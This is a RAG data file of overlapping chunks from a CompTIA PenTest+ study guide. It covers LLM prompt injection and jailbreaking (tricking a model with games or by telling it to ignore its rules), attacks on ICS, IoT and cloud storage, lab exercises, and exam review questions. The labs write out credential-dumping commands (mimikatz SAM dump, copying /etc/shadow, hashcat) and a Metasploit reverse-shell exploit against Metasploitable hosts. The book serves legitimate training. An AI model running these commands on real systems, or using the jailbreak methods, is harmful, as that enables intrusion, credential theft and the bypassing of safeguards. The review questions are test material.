rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	can also be used to trick a tool such as ChatGPT to reduce its own security by prompting it to remove its own guardrails, or to ignore instructions it has been given to secure information. Again, if prompted correctly, an attacker can inject whatever they want into the system. The only way to fully secure AI is to stop it from learning certain aspects of security, which goes against the nature of what it's programmed to do. Because of this, prompt injection remains a running issue with these types of systems. The main way a prompt injection attack can be reduced is by making sure that the model it learns from knows about these attacks and what will lead to the next attack, which is model manipulation. Model Manipulation Just as you were able to prompt inject false information or use the prompt to reduce security, you can also use model learning in the same manner. Model manipulation by jailbreaking the model, also known as jailbreaking the LLM. A prompt injection can use nonmalicious instructions to carry out malicious intent. The only way to protect against that is to manipulate the model the AI tool is using. That is done through safeguards or guardrails added to the model in order to keep it safe. However, you can use prompt injection methods to trick the model (thus manipulating it) to reduce its guard and thus “jailbreak” it. Known attacks are when attackers ask the tool to play a game and, by doing so, confuse it into dropping its guard. By telling it to ignore its rules, you can convince the AI tool to do so. Attacking IoT, ICS, Embedded Systems, and SCADA Devices When attacking operational technology (OT)‐based systems, there are many classes of devices that must be considered. In this section, we review what you need to know for the PenTest+ exam in the realm of OT, which covers ICS and other types of systems. First, let's review some of the basic attacks that come with using these types of systems. As a pentester, your role will be to assess these types of systems and see if they are exploitable or vulnerable. Specifically, when working with OT, industrial control systems (ICS) vulnerability assessments are tricky because they fall outside of the traditional technology that most information technologists are used to seeing. These systems range from various forms of technology that, in some cases, become specialized. Manual assessment of these systems becomes a new requirement that is more in line with physical security assessments we discussed in other chapters of this book. Physical security assessments (and site surveys) also play a large role in OT/ICS type attacks because the technology used with these systems is generally outside the scope of information technology and not something that an attacker readily knows about or how to breach. Many times, they rely on controls that are tied into computer‐based systems and provide a monitor to the system; these are commonly referred to as SCADA
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	in some cases, become specialized. Manual assessment of these systems becomes a new requirement that is more in line with physical security assessments we discussed in other chapters of this book. Physical security assessments (and site surveys) also play a large role in OT/ICS type attacks because the technology used with these systems is generally outside the scope of information technology and not something that an attacker readily knows about or how to breach. Many times, they rely on controls that are tied into computer‐based systems and provide a monitor to the system; these are commonly referred to as SCADA (Supervisory Control and Data Acquisition), and these systems provide that oversight and control. Various attacks revolve around conducting port mirrors of systems to capture information. Other types of attacks use captured information such as captured credentials in plaintext or replay attacks. Many controls come with electrical registers that can be manipulated to reduce control of the system. Other types of concerns come from devices that use different types of ways to communicate with other devices such as near‐field communication (NFC), which allows devices (industrial, mobile) to communicate in very close distance—that communication can then be captured and manipulated. Other systems use chips to manage or control systems in the form of radio‐frequency identification (RFID). RFID can also be used in a variety of ways, such as through a tag. All of these systems can be manipulated and exploited and must be tested. Another form of attack that is covered on the PenTest+ exam is the Modbus attack. A Modbus is a system that is used to communicate on industrial manufacturing equipment. It is a protocol that is used where you will have one system be a primary and others be the secondary. For the devices to transmit, they have to play a role. The system transmitting is the Modbus primary. The system receiving is the Modbus secondary. When dealing with industrial systems and equipment, this is a common protocol used to exchange control messages. The Modbus protocol is a protocol developed by Modicon and used specifically on programmable logic controllers (PLCs). Modbus attacks allow an attacker to use default and easily found information on codes and commands to send information to the primary system in order to take control of the system or influence its behavior. CAN Bus Attack A CAN bus attack takes place when a controller area network (CAN) bus is exploited. A CAN bus is used by newer automobiles with a large amount of technology installed within them, connecting everything together to allow for more functionality within the driving experience. For example, most sensors connected to the bus will connect to the main computer or system controller and allow for errors, commands, and other information needed to be sent over the bus. The main concern with this type of system is that if compromised, it can lead to a series of converting vulnerabilities, including taking over the systems itself, sending and showing false information, or creating failures
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	(CAN) bus is exploited. A CAN bus is used by newer automobiles with a large amount of technology installed within them, connecting everything together to allow for more functionality within the driving experience. For example, most sensors connected to the bus will connect to the main computer or system controller and allow for errors, commands, and other information needed to be sent over the bus. The main concern with this type of system is that if compromised, it can lead to a series of converting vulnerabilities, including taking over the systems itself, sending and showing false information, or creating failures that may cause further damage or harm. As with any other OT‐based system, it's imperative to test and audit these systems for vulnerabilities to ensure that they are secured correctly and or have not been exploited. OT, Embedded, and IoT Systems Attackers already know that embedded systems and Internet of Things (IoT) devices make great pivot points to access other elements of secured networks. Breaches like the 2013 Target compromise, which leveraged an HVAC control system compromise to target point‐of‐sale systems, have shown attackers using these systems to gain a foothold. As a penetration tester, you will want to think about how to attack IoT, SCADA, ICS, and embedded systems and how to use them to gain further access. Of course, pentesters have special considerations that an attacker might not. Avoiding availability concerns like preventing operational outages or interruptions that may cause your customer issues can be an important consideration. Specialized devices may also require different modes of attack since they may run the same software or have powerful CPUs or useful amounts of available storage, or they may have other limitations that may restrict their use. Specialized systems are often placed in fragile environments as controllers for production lines, environmental, power, or monitoring systems, or they may be a critical part of other business needs. That means you have to take additional precautions when scanning, probing, and attacking them—or that you may need to simply note their presence and any observed potential vulnerabilities and then validate your next steps with your customer. The PenTest+ exam outline targets a handful of specific concerns for IoT, SCADA, ICS, and industrial Internet of Things (IIoT) devices: BLE, or Bluetooth Low Energy, attacks come in a variety of flavors. BLE is susceptible to on‐path attacks, credential sniffing, spoofing via MAC address impersonation, and exploits that target pairing of devices, as well as denial‐of‐service attacks and jamming. Many devices rely on insecure pairing processes that use a simple numerical value that both sides must use, and many of those devices simply pass six zeros as their code, allowing any other device to pair with them without any actual validation of the remote device. As a pentester, you may need to discover and then identify BLE devices and then use the data you gather about it to identify which of these attacks are most likely to be successful. Bluetooth spamming is a type of attack
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	exploits that target pairing of devices, as well as denial‐of‐service attacks and jamming. Many devices rely on insecure pairing processes that use a simple numerical value that both sides must use, and many of those devices simply pass six zeros as their code, allowing any other device to pair with them without any actual validation of the remote device. As a pentester, you may need to discover and then identify BLE devices and then use the data you gather about it to identify which of these attacks are most likely to be successful. Bluetooth spamming is a type of attack used to advertise new connections as phantoms in order to overwhelm the target device. Bluejacking is a type of attack that can also spawn from spamming efforts, where unsolicited messages are sent, although they might not be more than an annoyance; if any phishing messages lead to malware, they can then lead to more of a direct attack. Many of these types of attacks or cracks that lead to a compromised device are considered bluecracks. Insecure defaults and hard‐coded configurations are both opportunities for pentesters. Organizations that don't change default usernames, passwords, and other settings, or that cannot change them due to the devices having them hard‐coded (permanently set) create opportunities for pentesters who gain access to the devices. Vulnerability scanning tools frequently have the ability to automatically identify these, but you should also work to identify devices and research if they have default credentials or known flaws as you find them during reconnaissance activities. Use of insecure or outdated components is common, particularly at the operating system level for embedded devices. IoT, ICS, SCADA, and other special‐purpose devices are often deployed in places or modes where updating them can be difficult. A controller for a production line or a building environmental system may be in place for years without updates. At the same time, it is common for manufacturers to offer infrequent updates if they provide patches and updates at all. This means that you're likely to encounter a combination of outdated firmware and hardware as you probe these devices, and that out‐of‐ date software, firmware, and hardware can provide a multitude of vulnerabilities that you can exploit. A final area that you'll need to consider is the use of cleartext communications and the resulting potential for data leakage. Use of HTTP instead of HTTPS, serial‐over‐IP protocols, and other unencrypted data transfer options remains common, particularly with older ICS, SCADA, and IoT devices. Encryption requires overhead from processors and thus requires more power, so devices may opt for less secure options. If those devices are then on an exposed network, or if you can gain access to the secure enclave where the devices are in use, you can capture data that they are sending. Data leakage could occur via other means, including leakage via files or logs, but most data leakage you'll encounter from devices like these will be via networked protocols. The PenTest+ exam tests your knowledge of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	unencrypted data transfer options remains common, particularly with older ICS, SCADA, and IoT devices. Encryption requires overhead from processors and thus requires more power, so devices may opt for less secure options. If those devices are then on an exposed network, or if you can gain access to the secure enclave where the devices are in use, you can capture data that they are sending. Data leakage could occur via other means, including leakage via files or logs, but most data leakage you'll encounter from devices like these will be via networked protocols. The PenTest+ exam tests your knowledge of OT and the many vulnerabilities that exist. Make sure that you are aware of the tools used that have been covered throughout this book to help pentest these types of attacks, such as Wireshark, Scapy, and tcprelay. If you can inject, replay or relay, capture, or read any information in transit on any of these devices or forge new packets to inject, an attacker can as well. In addition to these core issues you need to be aware of, the PenTest+ exam outline calls out supervisory control and data acquisition (SCADA), industrial control system (ICS), and industrial Internet of Things (IIoT) specific vulnerabilities. ICS is a broad term used to describe systems that control and manage devices, systems, sensors, and other elements of industrial processes. SCADA is one of a number of types of ICS, but you'll often see the terms used somewhat interchangeably. ICS typically includes operational technology—the monitoring and control devices that are the endpoints of an ICS deployment, PLCs (programmable logic controllers) that do local management of devices, human interfaces, control and diagnostics systems, and various other components. SCADA systems are used to automate and monitor industrial processes and systems and are most often associated with building management, utility systems, traffic control systems, and similar uses. They use SCADA specific protocols like ModBus, DNP3, and BACnet (which you won't need to be familiar with for the exam). From a pentester's perspective, SCADA environment pentesting often focuses on the PLCs and remote terminal units (RTUs), as shown in Figure 10.11, that collect data from sensors and devices, as well as the control systems and primary stations that are network connected and manage the environment. If you've never encountered a SCADA system before, you can find an overview at https://electrical‐engineering‐portal.com/scada‐dcs‐plc‐rtu‐ smart‐instrument. FIGURE 10.11 A simple SCADA environment design example IIoT is a newer concept and integrates the Internet‐of‐Things concepts with industrial controls and monitoring. For most pentesters, this doesn't change the overall process of identifying and leveraging IoT devices in a penetration test—but it does mean that you need to be aware of what you're probing and what its purpose may be in an organization. As with ICS and SCADA systems, causing an IIoT device to fail or improperly respond may have significant impacts on an organization's business, buildings, or infrastructure. One final specific type of embedded system that the PenTest+ exam guide mentions is the use of intelligent
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	IIoT is a newer concept and integrates the Internet‐of‐Things concepts with industrial controls and monitoring. For most pentesters, this doesn't change the overall process of identifying and leveraging IoT devices in a penetration test—but it does mean that you need to be aware of what you're probing and what its purpose may be in an organization. As with ICS and SCADA systems, causing an IIoT device to fail or improperly respond may have significant impacts on an organization's business, buildings, or infrastructure. One final specific type of embedded system that the PenTest+ exam guide mentions is the use of intelligent platform management interfaces (IPMIs). These interfaces are built into or can be added to many servers and some desktop PCs, and they are intended for low‐level system and hardware management, particularly when the system's operating system may not be fully functional or when hardware issues may have occurred. You may be familiar with them as Dell's DRAC or HP's iLO (integrated Lights Out) or similar product names that provide an IPMI. These out‐of‐band management interfaces are often Ethernet based, and most organizations run them on a separate secure VLAN. If you find IPMI interfaces on a network that you can access or are able to gain access to the secured VLAN, you may be able to obtain low‐level access to the server or device, typically via a web interface or command‐line management interface. Organizations that don't fully utilize or manage their lights‐out management capabilities are likely to have neglected to change the default usernames and passwords for them. Metasploit has a built‐in IPMI scanner and exploit tool, which can be quite helpful when you encounter IPMI‐based tools. Rapid7's 2013 write‐up describing how to discover and attack common IPMI interfaces remains useful today. You can review it at https://www.rapid7.com/blog/post/2013/07/02/a‐penetration‐testers‐ guide‐to‐ipmi/. Attacking Data Storage Gaining access to data is a key objective for pentesters for a number of reasons. Data is often the final target of penetration tests, and all of the information, accounts, and access gained along the way are merely a means to that end. At the same time, data gathered along the way may be useful when you attempt to pivot or gain further access. The PenTest+ exam outline considers a number of methods of attacking data storage that you'll need to be familiar with. The first of these is one that you're already used to looking for: misconfigured storage settings and environments. That can be as simple as a default username or blank password, or a storage bucket in Amazon's S3 set up with weak or public permissions. In cases like this, you'll need to first explore for storage systems or services, then check them to see what data can be discovered. Searching for AWS buckets for a penetration test can be as simple as executing a command from the AWS console: aws s3 ls s3://$bucketname/ ‐‐region $region. Remember that storage vulnerabilities can include list, read, write, and execution vulnerabilities. Listing files can provide information even if they're
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	storage settings and environments. That can be as simple as a default username or blank password, or a storage bucket in Amazon's S3 set up with weak or public permissions. In cases like this, you'll need to first explore for storage systems or services, then check them to see what data can be discovered. Searching for AWS buckets for a penetration test can be as simple as executing a command from the AWS console: aws s3 ls s3://$bucketname/ ‐‐region $region. Remember that storage vulnerabilities can include list, read, write, and execution vulnerabilities. Listing files can provide information even if they're unable to be read, and at times simply being able to upload a malicious file in a place where it may be run or accessed can be all you need to further the goals of your penetration test. Data storage attacks can also involve attacks on the underlying software or server by exploiting vulnerabilities. The April 2021 vulnerabilities announced in QNAP network attached storage (NAS) devices provide an example of this type of attack. The zero‐day attack leveraged a pair of critical vulnerabilities that allowed unauthenticated users to both manipulate data and take control of the device by exploiting a remote code execution vulnerability in the built‐in web server on devices and by exploiting the Digital Living Network Alliance (DLNA) service to write file data to any location or to execute arbitrary commands. You can read more about this exploit at https://threatpost.com/qnap‐nas‐devices‐zero‐day‐ attack/165165. Since many storage systems are exposed to either local networks or the Internet, attacks like these can be conducted remotely. That also means that other exploit techniques you're used to using against other services and servers also work. You may consider information gathering via error messages and debug handling output, exploits that take advantage of a lack of user input sanitization to exploit injection vulnerabilities, and similar techniques that you're familiar with from attacking web applications and database servers. In fact, the PenTest+ exam outline specifically calls out the single quote method of injection used for SQL injection as a technique to keep in mind when attacking data storage systems. Summary Cloud technologies are an increasingly important component in penetration tests. Credential harvesting techniques can be used to acquire user accounts. From there you can use privilege escalation attacks and other techniques to accomplish account takeover activities. You may also choose to try to get information from metadata services or through APIs often using software development toolkits (SDKs) specifically provided by cloud providers to allow programmatic access to their services. Side‐channel attacks, which gather information by observing data or environmental changes without directly being able to observe an environment, can also be useful in some cloud environments. Another major way into cloud environments is through exploitation of misconfigured services. Although improperly set up or overly permissive identity and access management (IAM) is one of the most commonly leveraged weaknesses, federation configuration issues, insecure object storage in services like S3, or weak configuration in containerization services can all
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	metadata services or through APIs often using software development toolkits (SDKs) specifically provided by cloud providers to allow programmatic access to their services. Side‐channel attacks, which gather information by observing data or environmental changes without directly being able to observe an environment, can also be useful in some cloud environments. Another major way into cloud environments is through exploitation of misconfigured services. Although improperly set up or overly permissive identity and access management (IAM) is one of the most commonly leveraged weaknesses, federation configuration issues, insecure object storage in services like S3, or weak configuration in containerization services can all allow you to gain a foothold in a cloud environment. Although they're less common during penetration attacks due to the potential issues they can create, denial‐of‐service and resource exhaustion attacks may also be desired or required as part of a penetration test. Well‐ designed, scalable, and secured cloud services can make traditional denial‐ of‐service attacks and resource exhaustion techniques difficult if not nearly impossible. Thus, direct‐to‐origin attacks, which identify the underlying services and systems behind a service and target them, may be useful for pentesters. Like other environments, cloud‐specific tools are also something that pentesters need to be aware of. ScoutSuite is a multicloud auditing tool that can be leveraged by pentesters, CloudBrute is a multicloud enumeration tool, Pacu is an AWS exploitation framework, and Cloud Custodian is intended to be used as a compliance and management tool but can be used to identify issues much like ScoutSuite can. The Internet of Things, ICS/SCADA, data storage systems, and embedded systems like management interfaces using IPMI all bring special considerations to penetration tests. They may be more fragile, more critical to processes or business, leading to availability concerns, and may require special handling to ensure that critical data isn't lost or corrupted. Since they're often harder to patch, may not have regular updates, often don't communicate securely, and can be hard to secure due to embedded default settings, they can also be useful targets for pentesters. You should also consider the communications protocols and connectivity options they offer, because Bluetooth Low Energy (BLE) and other low‐power protocols are frequently not implemented in secure ways. Mobile devices may be more accessible than traditional workstations, and pentesters need to know how to target Android and iOS devices. Many current attacks focus on application flaws as well as operating system vulnerabilities like insecure storage of data, vulnerabilities in passcodes and biometrics, and vulnerabilities in the underlying OS, the application stores, or the applications running on the devices. Reverse engineering of operating systems and applications, analysis of code and device images using sandboxes, and even virtualization of device images to allow brute‐force attacks are all possibilities for pentesters. Mobile device security assessment frameworks and application security testing tools can help target mobile devices used by employees at your target organization, including tools like Burp Suite, Drozer, among others. Many systems and services are hosted in virtualized or containerized environments. Pentesters need to know how to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of data, vulnerabilities in passcodes and biometrics, and vulnerabilities in the underlying OS, the application stores, or the applications running on the devices. Reverse engineering of operating systems and applications, analysis of code and device images using sandboxes, and even virtualization of device images to allow brute‐force attacks are all possibilities for pentesters. Mobile device security assessment frameworks and application security testing tools can help target mobile devices used by employees at your target organization, including tools like Burp Suite, Drozer, among others. Many systems and services are hosted in virtualized or containerized environments. Pentesters need to know how to identify when they have compromised a system or service that is virtualized or containerized. Although escaping from a VM or container is an attractive idea, actual escape methodologies are not as commonly available as other forms of attack. That may mean attacking the hypervisor itself or a repository so that the VMs themselves can be compromised before they run rather than while running. Regardless of how you attack, knowing that virtual systems and containers exist in an environment can help you find and target the underlying virtualization infrastructure in other ways. Pentesters also need to know how to create remote connections via tools like SSH, Netcat, and Ncat and how to use proxies to conceal their inbound and outbound traffic. Using proxies to pivot can also provide pentesters with access that bypasses security boundaries by leveraging compromised systems to build a path through secured networks. Credentials are useful throughout a penetration testing process. Acquiring user, administrative, and service accounts will allow you to attempt to access systems and devices, and escalating your privileges from even unprivileged accounts is a common technique during pentests. You should know where to find credentials in common operating systems, how to acquire them, and how to crack them using tools like Hashcat, Medusa, CeWL, John the Ripper, Mimikatz, Patator, DirBuster, and w3af. Exam Essentials Understand cloud technology attacks and tools. Attacks against cloud technologies include credential harvesting, privilege escalation, and account takeovers. Misconfigurations are one of the most common ways to gain access to accounts, systems, services, or data. Misconfigured identity and access management is a key flaw to exploit, but misconfigurations in object storage, containerization technologies, and federation misconfiguration can also be leveraged as part of a penetration test. You can obtain data via metadata service attacks and exploits and side‐channel attacks, and you can conduct denial‐of‐service attacks, including bypassing scaling and denial‐of‐service protections by using direct‐to‐origin attack techniques. Finally, you'll need to consider cloud software development kits (SDKs) that provide direct interfaces via APIs to cloud services, allowing you to write scripts and programs to help your penetration tests succeed. Explain storage, management, IoT, and SCADA/ICS vulnerabilities and their uses in a penetration test. Infrastructure systems like storage devices and services can contain a wealth of useful information. Misconfigurations that expose data are a key way to access storage systems, but compromising storage servers and controllers or gaining access using user credentials are
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	can conduct denial‐of‐service attacks, including bypassing scaling and denial‐of‐service protections by using direct‐to‐origin attack techniques. Finally, you'll need to consider cloud software development kits (SDKs) that provide direct interfaces via APIs to cloud services, allowing you to write scripts and programs to help your penetration tests succeed. Explain storage, management, IoT, and SCADA/ICS vulnerabilities and their uses in a penetration test. Infrastructure systems like storage devices and services can contain a wealth of useful information. Misconfigurations that expose data are a key way to access storage systems, but compromising storage servers and controllers or gaining access using user credentials are also common ways in. Management interfaces are used to control server hardware and can provide significant control over systems that use them. Although these interfaces are typically placed on isolated VLANs, pentesters may still be able to gain access or to find management interfaces that aren't properly secured. Internet of Things devices often suffer from a lack of patching and security and may provide pentesters with viable targets that provide access to networks or information that they can use. Finally, industrial control systems (ICSs), SCADA, and industrial Internet of Things devices are used to manage factories, utilities, and a wide range of other industrial devices. They require special care when testing due to the potential for harm to business processes and other infrastructure if they are disrupted. Explain mobile device attacks, vulnerabilities, and tools. Understand mobile device attacks, including reverse engineering applications and mobile operating systems. Explain what sandbox analysis is and when you'd use it. Leverage spamming techniques as part of mobile device attacks to gain credentials or conduct social engineering exploits. Describe vulnerabilities in mobile devices and applications, including use of insecure storage, attacks against authentication and authorization like biometrics integrations, passcode vulnerabilities, and overly broad permissions. Leverage flaws in known vulnerable components like dependencies or patching issues due to fragmentation of operating systems. Explain the basic functionality and uses of tools like Burp Suite, Drozer, MobSF, Postman, Ettercap, Frida and Objection, the Android SDK tools, APKX, and APK Studio. Use common techniques to allow remote access. Know common commands and tools that allow remote access via SSH, Netcat, and Ncat. Explain why, when, and how you can use proxies and proxychains to conceal attack traffic and to allow pivoting inside a secure network via compromised systems. Understand virtual machine and container exploits. Explain virtual machine and container concepts and the basic differences between them. Understand the concept of virtual machine and container escape techniques. List reasons that VM escape exploits are unlikely to be available during most penetration tests. Describe container escape exploits and scenarios. Perform credential attacks. Use offline credential cracking tools, and understand the differences, basic capabilities, and advantages of each. Create word lists and dictionaries, and explain how they can help with brute‐forcing and cracking activities. Be familiar with the uses and purposes of Hashcat, Medusa, Hydra, CeWL, John the Ripper, Cain, Mimikatz, Patator, DirBuster, and w3af. Lab Exercises Activity 10.1: Dumping and Cracking
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	concepts and the basic differences between them. Understand the concept of virtual machine and container escape techniques. List reasons that VM escape exploits are unlikely to be available during most penetration tests. Describe container escape exploits and scenarios. Perform credential attacks. Use offline credential cracking tools, and understand the differences, basic capabilities, and advantages of each. Create word lists and dictionaries, and explain how they can help with brute‐forcing and cracking activities. Be familiar with the uses and purposes of Hashcat, Medusa, Hydra, CeWL, John the Ripper, Cain, Mimikatz, Patator, DirBuster, and w3af. Lab Exercises Activity 10.1: Dumping and Cracking the Windows SAM and Other Credentials Dumping the Windows SAM is one of the most common tasks that a penetration tester will do after gaining access to a system. In this exercise, you will gain access to a Windows system and then obtain a copy of the Windows SAM. 1. Using the knowledge you have gained about the Metasploitable 3 Windows target system in other labs, exploit one of the existing vulnerable services and create a Meterpreter‐based reverse shell. 2. Now that you have access to the system, you can gather other credentials as well. Using your Meterpreter session, execute the following commands and record your findings. a. /post/windows/gather/lsa_secrets b. /post/windows/manage/wdi_digest caching To make sure WDigest now contains cached credentials, you should log into and out of the target system. c. creds_wdigest 3. Use your Meterpreter shell to copy the SAM: a. Check your user ID: getuid b. Obtain system credentials if you're not already NT AUTHORITY\SYSTEM: getsystem c. Recheck your user ID: getuid d. Dump the SAM: mimikatz_command -f samdump::hashes e. Copy the hashes and feed them to Hashcat in the next activity if you'd like! Activity 10.2: Cracking Passwords Using Hashcat In this exercise, you'll use Hashcat, the GPU password cracking utility built into Kali Linux, to crack passwords from a set of hashed passwords. 1. Start your Kali Linux VM. 2. Download a set of hashes. You can find hashes in a variety of places: The Kali box you're starting from. The DefCon 2012 KoreLogic challenge is a good starting place: http://contest‐2012.korelogic.com. The Pwned Passwords list at https://haveibeenpwned.com/Passwords is huge, but it offers a massive sample set to work with if you want more practice. For this exercise, we will use the Kali system's own password file. Once you have performed this basic exercise, you may want to move on to more complex cracking efforts, including those where you may not immediately know the hashing method used. Capture the Kali Linux /etc/shadow file. Since you are logged in as root, this is trivial. If you were logged into the system as a non‐root user, you would need to gain administrative privileges to do this. Fortunately, capturing /etc/shadow is easy; just copy /etc/shadow to a file with any name you want! cp /etc/shadow kali_hash.txt 3. On Linux systems you can check the type of hash in use by reviewing the settings found in /etc/login.defs. Doing this and searching
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	to move on to more complex cracking efforts, including those where you may not immediately know the hashing method used. Capture the Kali Linux /etc/shadow file. Since you are logged in as root, this is trivial. If you were logged into the system as a non‐root user, you would need to gain administrative privileges to do this. Fortunately, capturing /etc/shadow is easy; just copy /etc/shadow to a file with any name you want! cp /etc/shadow kali_hash.txt 3. On Linux systems you can check the type of hash in use by reviewing the settings found in /etc/login.defs. Doing this and searching for ENCRYPT_METHOD will show you that it is set to SHA512. 4. Next you need to clean up the hash file to remove unnecessary information like usernames and account policy settings. You can use vi to edit out everything but the hashes. For example, root shows as: root:$6$uPdhX/Zf$Kp.rcb4AWwtx0EJq235tzthWXdIEoJnhZjOHbil3od 1AyM f3t8Yi6dAPlhbHVG9SLx5VSIPrXTZB8ywpoOJgi.:17564:0:99999:7::: . You should trim this to just the hash: $6$uPdhX/Zf$Kp.rcb4AWwtx0EJq235tzthWXdIEoJnhZjOHbil3od1AyMf 3t8Y i6dAPlhbHVG9SLx5VSIPrXTZB8ywpoOJgi You're almost ready to use Hashcat, but you need to extract the rockyou word list that is included in Kali. It is located in:/usr/share/wordlists/rockyou.txt.gz. You'll notice it is gzipped, which means you need to extract it before using it. You can do so by copying the file to a location of your choice and then running gunzip rockyou.txt.gz. Make sure you remember where you extracted it to! 5. Now run Hashcat against your file. In this example we will use the rockyou word list included in Kali, but you may choose to use a different word list if you have built one for the organization you are targeting. In this example, ‐m sets the hash type, which is SHA‐512; ‐a O sets the attack as a dictionary attack; ‐o sets the output file; kali_hash.txt is the input file; and the result looks like this: hashcat -m 1800 -a 0 -o cracked_hashes.txt kali_hash.txt /home/ 6. You already know the password for root on your Kali system, so you shouldn't be surprised to see toor! Now grab another password file or one of the lists of hashes from the links listed and try it out! The ‐a flag requires a number, not a letter, so make sure you set ‐a to 0! You can see all of the flags that Hashcat accepts by reading its manpage —just type man hashcat and read through it or use built‐in help via hashcat ‐h. Activity 10.3: Setting Up a Reverse Shell and a Bind Shell In this exercise, you will set up both a reverse shell and a bind shell using Metasploit. This exercise can be done using a Metasploitable Windows host. To prepare for this exercise, start your Kali Linux system and your Windows Metasploitable host, and make sure that you can connect from the Kali system to the Windows host. 1. Determine what vulnerability you want to attack on the Metasploitable system. You can use vulnerabilities you have previously recorded, or you can run a new vulnerability scan to identify vulnerable
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	‐h. Activity 10.3: Setting Up a Reverse Shell and a Bind Shell In this exercise, you will set up both a reverse shell and a bind shell using Metasploit. This exercise can be done using a Metasploitable Windows host. To prepare for this exercise, start your Kali Linux system and your Windows Metasploitable host, and make sure that you can connect from the Kali system to the Windows host. 1. Determine what vulnerability you want to attack on the Metasploitable system. You can use vulnerabilities you have previously recorded, or you can run a new vulnerability scan to identify vulnerable services. 2. Start Metasploit and select the vulnerability you want to use. For this example, we will use the ManageEngine vulnerabilities we have previously identified, but you can choose another vulnerability if you want to explore other options. 3. Select the ManageEngine exploit: use exploit/windows/http/manageengine_connectionid_write 4. Set the remote host and local host: set RHOST [remote system IP] set LHOST [local system IP] 5. Set the remote port: Set RPORT 8022 6. Set a payload: Set payload windows/meterpreter/reverse_tcp 7. Exploit the Windows system using the exploit command. You should now see a Meterpreter session opened in your Metasploit window. 8. Repeat this process, using the Windows shell bind tcp payload: payload/windows/shell_bind_tcp. You will need to explore the options for this module to successfully connect to the bind shell—make sure you read them fully! Review Questions You can find the answers in the Appendix A. 1. Scott wants to crawl his penetration testing target's website and then build a word list using the data he recovers to help with his password cracking efforts. Which of the following tools should he use? A. DirBuster B. CeWL C. OLLY D. Grep‐o‐matic 2. Michelle wants to attack the underlying hypervisor for a virtual machine. What type of attack is most likely to be successful? A. Container escape B. Compromise the administrative interface C. Hypervisor DoS D. VM escape 3. Jeff identifies the IP address contained in the content delivery network (CDN) configuration for his target organization. He knows that that server's content is replicated by the CDN, and that if he is able to conduct a denial‐of‐service attack on the host he will be able to take down his target's web presence. What type of attack is Jeff preparing to conduct? A. A side ‐channel attack B. A direct‐to‐origin attack C. A federation misconfiguration attack D. A metadata service attack 4. Claire knows that her target organization leverages a significant number of IoT devices and that she is likely to need to use one or more of them as pivot points for her penetration test. Which of the following is not a common concern when conducting a penetration test involving IoT devices? A. Impacts to availability B. Fragile environments C. Data leakage D. Data corruption 5. Susan wants to use a web application vulnerability scanner to help map an organization's web presence and to identify existing vulnerabilities. Which of the following tools is best
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attack D. A metadata service attack 4. Claire knows that her target organization leverages a significant number of IoT devices and that she is likely to need to use one or more of them as pivot points for her penetration test. Which of the following is not a common concern when conducting a penetration test involving IoT devices? A. Impacts to availability B. Fragile environments C. Data leakage D. Data corruption 5. Susan wants to use a web application vulnerability scanner to help map an organization's web presence and to identify existing vulnerabilities. Which of the following tools is best suited to her needs? A. Paros B. CUSpider C. Patator D. w3af 6. Madhuri has discovered that the organization she is conducting a penetration test against makes extensive use of industrial control systems to manage a manufacturing plant. Which of the following components is least likely to respond to her normal penetration testing tools like Nmap and Metasploit? A. RTUs B. Field devices C. PLCs D. Master stations 7. Ben wants to conduct a penetration test against a service that uses containers hosted by a cloud service provider. Which of the following targets is not typically part of the scope for a penetration test against a containerized environment? A. The application B. APIs used by the containers C. Databases used by the containers D. The underlying containerization service 8. Jocelyn wants to conduct a resource exhaustion attack against her penetration testing target, which uses an autoscaling service architecture that leverages a content delivery network. What technique is most likely to help her succeed? A. A BLE attack B. A direct‐to‐origin attack C. An IPMI attack D. A VM escape attack 9. Isabelle wants to gain access to a cloud infrastructure as a service environment. Which of the following is not a common technique to gain this type of access for a penetration test? A. Acquire an inadvertently exposed key through a public code repository. B. Use a brute‐force tool against a harvested credential that requires two factors. C. Acquire an inadvertently exposed key through a misconfigured object store. D. Probe for incorrectly assigned permissions for a service or system. Use the following scenario for questions 10–12. Charleen has been tasked with the components of a penetration test that deal with mobile devices at a large client organization. She has been given a standard corporate device to test that uses the organization's base configuration for devices that are issued to employees. As part of her team, you've been asked to provide input on the penetration testing process. Answer each of the following questions based on your knowledge about mobile device attacks, vulnerabilities, and analysis tools. 10. Charleen wants to use a cloned image of a phone to see if she can access it using brute‐force passcode‐breaking techniques. Which of the following techniques will allow her to do this without an automatic wipe occurring if “wipe after 10 passcode attempts” is set for the device? A. Reverse engineering B. Containerization C. Sandbox
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	organization's base configuration for devices that are issued to employees. As part of her team, you've been asked to provide input on the penetration testing process. Answer each of the following questions based on your knowledge about mobile device attacks, vulnerabilities, and analysis tools. 10. Charleen wants to use a cloned image of a phone to see if she can access it using brute‐force passcode‐breaking techniques. Which of the following techniques will allow her to do this without an automatic wipe occurring if “wipe after 10 passcode attempts” is set for the device? A. Reverse engineering B. Containerization C. Sandbox analysis D. Rainbow tables 11. Charleen has determined that the organization she is testing uses certificate pinning for their web application. What technique is most likely to help her overcome this so that she can conduct an on‐path attack? A. Social engineering B. Reverse engineering C. Using a flaw in object storage security D. Data exfiltration 12. Charleen wants to perform static code analysis of the mobile application her target installed on the device in her possession. Which of the following tools should she select? A. Objection B. MobSF C. Frida D. Burp Suite 13. Alice is conducting a penetration test of an organization's AWS infrastructure. What tool should she select from the following list if she wants to exploit AWS? A. Pacu B. Cloud Custodian C. CloudBrute D. BashAWS 14. What type of attack focuses on 